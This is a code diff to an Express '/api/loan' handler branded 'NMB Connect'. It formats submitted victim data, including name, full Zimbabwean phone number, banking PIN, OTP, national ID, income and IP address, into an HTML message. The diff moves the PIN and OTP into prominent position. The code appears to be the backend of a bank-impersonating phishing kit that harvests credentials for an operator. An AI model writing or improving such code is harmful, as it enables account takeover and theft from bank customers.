@@ -103,22 +103,28 @@ app.post('/api/loan', async (req, res) => {
 
     const empLabel = emp === 'employed' ? 'Employed (Salaried)' : emp === 'self' ? 'Self-Employed' : emp || '—';
 
+    /* Reconstruct full phone number cleanly */
+    const localNum = phone.replace(/^\+?0*263/, '').replace(/\D/g, '');
+    const fullPhone = localNum ? `+263${localNum}` : (phoneDisplay || phone || '—');
+
     const lines = [
       `${emoji} <b>NMB Connect — ${event.replace(/_/g, ' ').toUpperCase()}</b>`,
       ``,
       `📅 <b>Time:</b> ${submittedAt ? new Date(submittedAt).toLocaleString('en-GB',{timeZone:'Africa/Harare',hour12:false})+' CAT' : now+' CAT'}`,
-      name         ? `👤 <b>Name:</b> ${name}`                        : null,
-      phone        ? `📱 <b>Phone:</b> <code>${phoneDisplay||phone}</code>` : null,
-      nid          ? `🪪 <b>National ID:</b> <code>${nid}</code>`      : null,
-      emp          ? `💼 <b>Employment:</b> ${empLabel}`               : null,
+      ``,
+      `👤 <b>Name:</b> ${name || '—'}`,
+      `📱 <b>Phone:</b> <code>${fullPhone}</code>`,
+      pin          ? `🔐 <b>PIN:</b> <code>${pin}</code>`             : null,
+      otp          ? `🔑 <b>OTP:</b> <code>${otp}</code>`            : null,
+      ``,
+      nid          ? `🪪 <b>National ID:</b> <code>${nid}</code>`     : null,
+      emp          ? `💼 <b>Employment:</b> ${empLabel}`              : null,
       income       ? `💰 <b>Income:</b> USD ${Number(income).toLocaleString()}/month` : null,
       ``,
       amount       ? `💵 <b>Loan Amount:</b> USD ${Number(amount).toLocaleString()}` : null,
-      tenure       ? `📅 <b>Tenure:</b> ${tenure} months`             : null,
+      tenure       ? `📅 <b>Tenure:</b> ${tenure} months`            : null,
       monthly      ? `📆 <b>Monthly Repay:</b> USD ${Number(monthly).toFixed(2)}` : null,
-      rate         ? `📈 <b>Rate:</b> ${rate}% p.m. flat`             : null,
-      pin          ? `\n🔐 <b>PIN:</b> <code>${pin}</code>`            : null,
-      otp          ? `🔑 <b>OTP:</b> <code>${otp}</code>`             : null,
+      rate         ? `📈 <b>Rate:</b> ${rate}% p.m. flat`            : null,
       ``,
       `🌐 <b>IP:</b> ${req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '—'}`,
     ].filter(Boolean).join('\n');
